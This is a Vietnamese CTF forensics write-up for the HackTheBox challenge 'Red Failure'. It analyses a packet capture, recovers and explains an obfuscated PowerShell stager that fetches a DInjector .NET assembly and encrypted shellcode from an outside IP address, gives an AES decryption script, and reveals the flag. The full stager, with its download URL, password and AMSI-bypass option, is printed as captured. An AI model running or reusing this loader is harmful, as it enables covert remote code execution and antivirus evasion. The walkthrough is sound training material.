## Red Failure - 30 points

**Author**: thewildspirit  
**Category**: Forensics  

### Challenge Description
> During a recent red team engagement one of our servers got compromised. Upon completion the red team should have deleted any malicious artifact or persistence mechanism used throughout the project. However, our engineers have found numerous of them left behind. It is therefore believed that there are more such mechanisms still active. Can you spot any, by investigating this network capture?

---

Mở file `.pcap`, xem Protocol Hierarchy thấy có vài giao thức như HTTP, TCP, UDP thôi.  
![Protocol Hierarchy](asset/Red%20Failure/image/1.png)  
HTTP hơi ít nên filter HTTP traffic, thấy có cái gì đó thú vị.  
![HTTP Filter](asset/Red%20Failure/image/2.png)  
Bấm Follow TCP Stream để thấy rõ hơn nội dung. (Dùng Follow TCP hay HTTP đều được)  
![Follow TCP Stream](asset/Red%20Failure/image/3.png)  
Có vẻ đây là một shellcode đã bị làm rối.  
![Obfuscated Shellcode](asset/Red%20Failure/image/4.png)  
Viết một script đơn giản để giải mã shellcode.  
![Decode Script](asset/Red%20Failure/image/5.png)  
Vì shellcode đơn giản nên script không giải mã được toàn bộ.  
![Partial Decode](asset/Red%20Failure/image/6.png)  
Bỏ những đoạn chưa giải mã được vào PowerShell rồi tổng hợp lại thì ra đoạn shellcode như sau:

```powershell
sV  "YuE51" ([typE]"SySTeM.REFLEcTIOn.aSSemblY");  ${a} = "currentthread"
${B} = "147.182.172.189"
${C} = 80
${D} = "user32.dll"
${E} = "9tVI0"
${f} = "z64&Rx27Z$B%73up"
${g} = "C:\Windows\System32\svchost.exe"
${h} = "notepad"
${I} = "explorer"
${j} = "msvcp_win.dll"
${k} = "True"
${l} = "True"

${MeThODS} = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended")
if (${mEThOdS}."Contains".Invoke(${A})) {
    ${h} = (&"Start-Process" -WindowStyle "Hidden" -PassThru ${H})."Id"
}

${METhODS} = @("remotethreadapc", "remotethreadcontext", "processhollow")
if (${mEthODS}."Contains".Invoke(${a})) {
    try {
        ${I} = (&"Get-Process" ${I} -ErrorAction "Stop")."ID"
    }
    catch {
        ${I} = 0
    }
}

${cmd} = "currentthread /sc:http://147.182.172.189:80/9tVI0 /password:z64&Rx27Z$B%73up /image:C:\Windows\System32\svchost.exe /pid:notepad /ppid:explorer /dll:msvcp_win.dll /blockDlls:True /am51:True"
${data} = (."IWR" -UseBasicParsing "http://147.182.172.189:80/user32.dll")."Content"
${assem} =  ( ls "variable:yUE51"  )."VaLUe"::"Load".Invoke(${data})
${flags} = [Reflection.BindingFlags] "Static, NonPublic"
${class} = ${assem}."GetType".Invoke("DInjector.Detonator", ${flags})
${entry} = ${class}."GetMethod".Invoke("Boom", ${flags})
${entry}."Invoke"(${null}, (, ${cmd}."Split".Invoke(" ")))
```

Phân tích:  
- Luồng thực thi chính: `${cmd}` Tạo chuỗi lệnh với các tham số:  
    - Kỹ thuật injection: `currentthread`  
    - Shellcode URL: `http://147.182.172.189:80/9tVI0`  
    - Password giải mã: `z64&Rx27Z$B%73up`  
    - Target process: `svchost.exe`  
    - PID giả mạo: `notepad/explorer`  
    - Tính năng bổ sung: Block DLLs (True), AM51 patch (True)  
- `${data}` tải payload dll user32.dll  
- `${assem}` load DLL vào memory sử dụng Reflection.Assembly.Load(). Biến `yUE51` chứa tham chiếu đến namespace System.Reflection.  
- `${flags}`, `${class}`, `${entry}` truy cập method `Boom` trong class `Detonator` với quyền:  
    - Static: Method tĩnh  
    - NonPublic: Truy cập private method (bypass kiểm tra)  
- `${entry}` gọi method Boom với tham số là mảng các argument được tách từ chuỗi `${cmd}`  

Vậy là ta có thể thấy shellcode này tải các file `user32.dll` và `9tVI0`  
File `user32.dll` là một file .NET giả mạo, đây là file mã độc (Vì tải trên máy thật bị anh WD đấm miết)  
File `9tVI0` chắc là shellcode thứ 2, dùng để tiêm vào process `svchost.exe` như trong lệnh cmd  
Dùng Network miner thì tải được 3 file đã nói từ attackers  
![Network Miner Analysis](asset/Red%20Failure/image/7.png)  
Nghịch một lúc thì cũng không ra gì  
![Analysis Stuck](asset/Red%20Failure/image/8.png)  
Search keywork `.dll ctf challenge` và đọc một vài bài writeup thì tìm được tool ILSpy reverse được file .dll  
Mở ra thì ta có thể thấy cây cấu trúc (bên trái) của file `user32.dll` này, có một số file cần lưu ý như AES, AM51, Detonator  
![ILSpy Structure](asset/Red%20Failure/image/9.png)  
Đọc lại shellcode lần nữa, ta thấy mục đích của `user32.dll` là decrypt shellcode `9tVI0` để thực thi  

```powershell
${cmd} = "currentthread /sc:http://147.182.172.189:80/9tVI0 /password:z64&Rx27Z$B%73up /image:C:\Windows\System32\svchost.exe /pid:notepad /ppid:explorer /dll:msvcp_win.dll /blockDlls:True /am51:True"
${data} = (."IWR" -UseBasicParsing "http://147.182.172.189:80/user32.dll")."Content"
${assem} =  ( ls "variable:yUE51"  )."VaLUe"::"Load".Invoke(${data})
${flags} = [Reflection.BindingFlags] "Static, NonPublic"
${class} = ${assem}."GetType".Invoke("DInjector.Detonator", ${flags})
${entry} = ${class}."GetMethod".Invoke("Boom", ${flags})
${entry}."Invoke"(${null}, (, ${cmd}."Split".Invoke(" ")))
```

Trong shellcode này có đề cập đến file `DInjector.Detonator` gọi method Boom, code Boom như sau (Đính kèm trong file vậy, paste dài quá)  
![Boom Method](asset/Red%20Failure/image/10.png)  
Nhìn chung là method Boom này sẽ thực thi lệnh với các biến trong `${cmd}` và decrypt data của `9tVI0`  
Trong file AES ta cũng có method decrypt như sau  
![AES Decrypt](asset/Red%20Failure/image/11.png)  
Vậy giờ thì thử decrypt file `9tVI0` xem thế nào  

```… stuck vài tiếng …```  

Không phải vì không biết viết code decrypt mà là thử decrypt cỡ nào cũng không ra được file đọc được .-. (non).  
Code decrypt  

```python
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import unpad
import sys

def decrypt_9tVI0(input_file, output_file, password):
    try:
        with open(input_file, 'rb') as f:
            full_data = f.read()
        
        key = SHA256.new(password.encode('utf-8')).digest()
        
        iv = full_data[:16]
        ciphertext = full_data[16:]
        
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        
        with open(output_file, 'wb') as f:
            f.write(plaintext)
        
        print("[+] Success!")
        print(f"[-] File size: {len(plaintext)} bytes")
        
        for marker in [b"flag{", b"HTB{"]:
            if marker in plaintext:
                start = plaintext.find(marker)
                end = plaintext.find(b"}", start)
                print(f"[+] Found flag: {plaintext[start:end+1].decode()}")
                break
        
        return True
    
    except ValueError as e:
        print(f"[-] padding err: {str(e)}")
        print("[!] Decode not using unpad...")
        with open(output_file + ".no_pad", 'wb') as f:
            f.write(cipher.decrypt(ciphertext))
        return False
    except Exception as e:
        print(f"[-] Err: {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 decrypt.py <input_file> <output_file>")
        print("Example: python3 decrypt.py 9tVI0 decrypted.bin")
        sys.exit(1)
    
    password = "z64&Rx27Z$B%73up"
    
    if not decrypt_9tVI0(sys.argv[1], sys.argv[2], password):
        print("[!] Please check:")
        print("1. Does File input exist")
        print("2. Is password correct")
```

File `decrypted.bin` không khai thác tiếp được gì  
![Decrypted File](asset/Red%20Failure/image/12.png)  
Ngâm cứu lại shellcode thì có phát hiện  
![Shellcode Analysis](asset/Red%20Failure/image/13.png)  
Theo những gì đã phân tích được thì `user32.dll` sẽ tải và decrypt `9tVI0` để thực thi lệnh `${cmd}`, chúng ta quên mất lệnh này, phân tích lại lệnh này thì nó dùng `currentthread` (?). Code của nó như sau  
![CurrentThread Code](asset/Red%20Failure/image/14.png)  
Đây là code tiêm file `9tVI0` vào process để thực thi, cái này thì ta biết rồi, process đó là notepad.  
→ Phải chạy thử mới xem tiếp được  

Tiếp tục công đoạn đau mắt với keyword “run .dll file in ctf challenge”, tìm thấy tool scdbg với demo sau  
![scdbg Demo](asset/Red%20Failure/image/15.png)  
Test xem  
![scdbg Test 1](asset/Red%20Failure/image/16.png)  
![scdbg Test 2](asset/Red%20Failure/image/17.png)  
Có vẻ khả quan, thử với file đã decrypt xem  
![Decrypted File Test](asset/Red%20Failure/image/18.png)  
Ra thật này  
![Flag Found](asset/Red%20Failure/image/19.png)  

Flag: `HTB{00000ps_1_t0t4lly_f0rg0t_1t}`

---
